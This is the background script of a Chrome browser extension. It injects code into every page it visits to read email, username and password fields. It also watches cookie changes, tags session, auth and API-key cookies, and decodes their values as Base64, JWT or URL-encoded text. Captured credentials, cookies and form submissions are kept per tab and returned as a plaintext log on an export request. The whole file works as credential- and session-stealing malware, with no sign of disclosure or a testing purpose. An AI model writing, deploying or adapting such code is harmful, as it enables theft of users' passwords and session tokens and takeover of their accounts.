// Background script loaded and active
console.log("Background script loaded and active.");

// Object to store cookies and credentials grouped by tabId
let dataByTab = {}; 
let sessionStartTime = new Date();

// Cookie analysis utilities
class CookieAnalyzer {
    static cookieTypes = {
        SESSION: 'session',
        PERSISTENT: 'persistent',
        SECURE: 'secure',
        HTTPONLY: 'httponly'
    };

    static sensitivePatterns = {
        SESSION_ID: /sess(ion)?[_-]?id/i,
        AUTH_TOKEN: /(auth|token|jwt|bearer)/i,
        API_KEY: /(api[_-]?key|access[_-]?key)/i,
        OAUTH: /oauth/i
    };

    static async analyzeCookie(cookie) {
        const analysis = {
            name: cookie.name,
            value: cookie.value,
            type: [],
            sensitiveData: [],
            decodedValue: null
        };

        // Categorize cookie type
        if (cookie.session) analysis.type.push(this.cookieTypes.SESSION);
        if (!cookie.session) analysis.type.push(this.cookieTypes.PERSISTENT);
        if (cookie.secure) analysis.type.push(this.cookieTypes.SECURE);
        if (cookie.httpOnly) analysis.type.push(this.cookieTypes.HTTPONLY);

        // Check for sensitive patterns
        for (const [pattern, regex] of Object.entries(this.sensitivePatterns)) {
            if (regex.test(cookie.name.toLowerCase())) {
                analysis.sensitiveData.push(pattern);
            }
        }

        // Attempt to decode/decrypt value
        analysis.decodedValue = await this.attemptDecode(cookie.value);

        return analysis;
    }

    static async attemptDecode(value) {
        try {
            // Try Base64 decoding
            const base64Decoded = atob(value.replace(/-/g, '+').replace(/_/g, '/'));
            if (this.isReadable(base64Decoded)) {
                return {
                    method: 'Base64',
                    value: base64Decoded
                };
            }
        } catch (e) {}

        try {
            // Try JWT decoding
            if (value.split('.').length === 3) {
                const [header, payload] = value.split('.').slice(0, 2)
                    .map(part => JSON.parse(atob(part.replace(/-/g, '+').replace(/_/g, '/'))));
                return {
                    method: 'JWT',
                    header,
                    payload
                };
            }
        } catch (e) {}

        try {
            // Try URL decoding
            const urlDecoded = decodeURIComponent(value);
            if (urlDecoded !== value && this.isReadable(urlDecoded)) {
                return {
                    method: 'URL',
                    value: urlDecoded
                };
            }
        } catch (e) {}

        return null;
    }

    static isReadable(str) {
        // Check if string contains readable characters
        return /^[\x20-\x7E]+$/.test(str) && str.length > 1;
    }
}

// Listen for navigation completion events
chrome.webNavigation.onCompleted.addListener(({ tabId, frameId }) => {
    if (frameId !== 0) return; // Skip if not top-level frame
    chrome.scripting.executeScript({
        target: { tabId },
        function: captureCredentials
    });
});

// Credential capture function to be injected
function captureCredentials() {
    const emailInput = document.querySelector('input[type="email"]');
    const usernameInput = document.querySelector('input[name="username"]');
    const passwordInput = document.querySelector('input[type="password"]');

    const user = emailInput ? emailInput.value : (usernameInput ? usernameInput.value : null);
    const password = passwordInput ? passwordInput.value : null;

    if (user || password) {
        chrome.runtime.sendMessage({
            action: 'storeCredentials',
            data: { user, password }
        });
    }
}

// Listen for cookie changes
chrome.cookies.onChanged.addListener(async ({ cookie, removed }) => {
    if (removed) return;

    const analysis = await CookieAnalyzer.analyzeCookie(cookie);
    
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach((tab) => {
            if (tab.url.includes(cookie.domain)) {
                if (!dataByTab[tab.id]) {
                    dataByTab[tab.id] = { 
                        cookies: [], 
                        credentials: null,
                        formSubmissions: [],
                        autoCompleteData: []
                    };
                }

                dataByTab[tab.id].cookies.push({
                    original: cookie,
                    analysis: analysis
                });

                console.log(`Analyzed cookie for tab ${tab.id}:`, analysis);
            }
        });
    });
});

// Handle messages
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    switch (message.action) {
        case 'storeCredentials':
            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                const tabId = tabs[0].id;
                if (!dataByTab[tabId]) {
                    dataByTab[tabId] = {
                        cookies: [],
                        credentials: null,
                        formSubmissions: [],
                        autoCompleteData: []
                    };
                }
                dataByTab[tabId].credentials = message.data;
                console.log(`Stored credentials for tab ${tabId}`);
            });
            break;

        case 'storeFormSubmission':
            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                const tabId = tabs[0].id;
                if (!dataByTab[tabId]) {
                    dataByTab[tabId] = {
                        cookies: [],
                        credentials: null,
                        formSubmissions: [],
                        autoCompleteData: []
                    };
                }
                dataByTab[tabId].formSubmissions.push(message.data);
                console.log(`Stored form submission for tab ${tabId}`);
            });
            break;

        case 'exportCookies':
            const log = generateDataLog();
            sendResponse({ log });
            break;
    }
    return true; // Keep message channel open for async response
});

// Generate data log
function generateDataLog() {
    const sessionEndTime = new Date();
    let log = `Browsing session: ${sessionStartTime.toISOString()} to ${sessionEndTime.toISOString()}\n\n`;

    for (const [tabId, data] of Object.entries(dataByTab)) {
        log += `Tab ID: ${tabId}\n`;
        
        // Log credentials
        if (data.credentials) {
            const { user, password } = data.credentials;
            log += `Credentials:\n  User: ${user || "Not captured"}\n  Password: ${password || "Not captured"}\n`;
        }
        
        // Log cookies with analysis
        data.cookies.forEach((cookie, index) => {
            log += `Cookie(${index + 1}):\n`;
            log += `  Name: ${cookie.analysis.name}\n`;
            log += `  Value: ${cookie.analysis.value}\n`;
            log += `  Types: ${cookie.analysis.type.join(', ')}\n`;
            if (cookie.analysis.sensitiveData.length > 0) {
                log += `  Sensitive Data Patterns: ${cookie.analysis.sensitiveData.join(', ')}\n`;
            }
            if (cookie.analysis.decodedValue) {
                log += `  Decoded (${cookie.analysis.decodedValue.method}): ${
                    JSON.stringify(cookie.analysis.decodedValue.value, null, 2)}\n`;
            }
            log += '\n';
        });

        // Log form submissions
        if (data.formSubmissions && data.formSubmissions.length > 0) {
            log += `Form Submissions:\n`;
            data.formSubmissions.forEach((submission, index) => {
                log += `  Submission ${index + 1}:\n`;
                log += `    URL: ${submission.url}\n`;
                log += `    Time: ${submission.timestamp}\n`;
                log += `    Fields: ${JSON.stringify(submission.fields, null, 2)}\n`;
            });
        }

        log += '\n';
    }

    return log;
}

// Clean up on tab close
chrome.tabs.onRemoved.addListener((tabId) => {
    delete dataByTab[tabId];
});